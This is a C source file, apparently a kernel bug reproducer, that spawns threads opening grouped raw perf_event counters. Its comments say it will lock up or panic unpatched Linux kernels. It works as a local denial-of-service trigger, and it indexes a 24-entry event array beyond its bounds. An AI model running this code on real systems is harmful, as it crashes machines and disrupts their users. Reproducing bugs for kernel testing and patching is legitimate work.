/* pe_multiplex_panic.c  */
/* by Vince Weaver   vweaver1 _at_ eecs.utk.edu */

/* Running has a good chance of panicing unpatched kernel */
/* Based on behavior of mpx-pthread.c from perfsuite      */

/* Compile with gcc -O2 -Wall -o pe_multiplex_panic pe_multiplex_panic.c -lpthread */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

#include <unistd.h>
#include <sys/ioctl.h>
#include <asm/unistd.h>
#include <sys/prctl.h>
#include <linux/perf_event.h>

#define NUM_EVENTS 64

int nehalem_events[24]={
   0x52003c,0x5200c0,0x52010b,0x520143,
   0x520149,0x520151,0x520185,0x520188,
   0x5201a2,0x5201d0,0x52020b,0x520224,
   0x520280,0x520288,0x520324,0x520410,
   0x520824,0x520f27,0x520f40,0x520f41,
   0x5210cb,0x522024,0x524088,0x52412e
};

int perf_event_open(struct perf_event_attr *hw_event_uptr,
		    pid_t pid, int cpu, int group_fd, unsigned long flags) {
 
   return syscall(__NR_perf_event_open, hw_event_uptr, pid, cpu, group_fd,flags);
}

double busywork(int count) {
 
   int i;
   double sum=0.0012;
   
   for(i=0;i<count;i++) {
      sum+=0.01;
   }
   return sum;
   
}


void *thread_work(void *blah) {
   
   int fd_array[NUM_EVENTS];
   int fd_masters[NUM_EVENTS];
   int num_masters=0,need_master=1;
   int i,ret;
   
   struct perf_event_attr pe;
   memset(&pe,0,sizeof(struct perf_event_attr));

   i=0;
   while(1) {

      pe.type=PERF_TYPE_RAW;
      pe.config=nehalem_events[i%NUM_EVENTS];
      pe.disabled=0;
      pe.inherit=1;
      pe.exclude_kernel=1;
      pe.exclude_hv=1;
      pe.read_format=7;
      
      if (need_master) {	 
         fd_masters[num_masters]=perf_event_open(&pe,0,-1,-1,0);
         if (fd_masters[num_masters]<0) {
//            fprintf(stderr,"Error opening master %i %llx\n",
//		   i,pe.config);
            break;
	 }
	 need_master=0;
	 num_masters++;
	 i++;
      }
      else {
	    
         fd_array[i]=perf_event_open(&pe,0,-1,fd_masters[num_masters-1],0);
         if (fd_array[i]<0) {
//            fprintf(stderr,"Error opening %i\n",i);
            need_master=1;
	 } else {
	   i++;  
	 }
      }
      if (i>=NUM_EVENTS) break;
   }

   printf("Added %d events in %d sets\n",i,num_masters);

   /* start events */
   for(i=0;i<num_masters;i++) {
      ret=ioctl(fd_masters[i],PERF_EVENT_IOC_ENABLE,NULL);
      if (ret<0) fprintf(stderr,"Error enabling fd %d\n",fd_masters[i]);
      
   }
   
   busywork(10000000);
   
   for(i=0;i<num_masters;i++) {
      ret=ioctl(fd_masters[i],PERF_EVENT_IOC_DISABLE,NULL);
      if (ret<0) fprintf(stderr,"Error disabling fd %d\n",fd_masters[i]);
   }
   
   return NULL;
}



#define NUM_THREADS 16

int main(int argc, char** argv) {
   
   pthread_t *threads;
   int ret,i,j;   
   
   printf("\nOn unpatched kernels, running will eventually lock or \n");
   printf("\tpanic the system.\n\n");
   
   threads = (pthread_t *)malloc(NUM_THREADS*sizeof(pthread_t));
   if (threads==NULL) {
      fprintf(stderr,"Could not allocate memory\n");
      exit(1);
   }
   
   for(i=0;i<NUM_THREADS;i++) {
      
      ret=pthread_create(&threads[i],NULL,thread_work,NULL);	 
      if (ret!=0) {
	 fprintf(stderr,"Could not create thread %i\n",i);
	 break;
      }
   }
      
   for(j=0;j<i;j++) {
      ret=pthread_join(threads[j],NULL);	 
      if (ret!=0) {
	 fprintf(stderr,"Could not join thread %i\n",j);
      }
   }
   
   return 0;
}

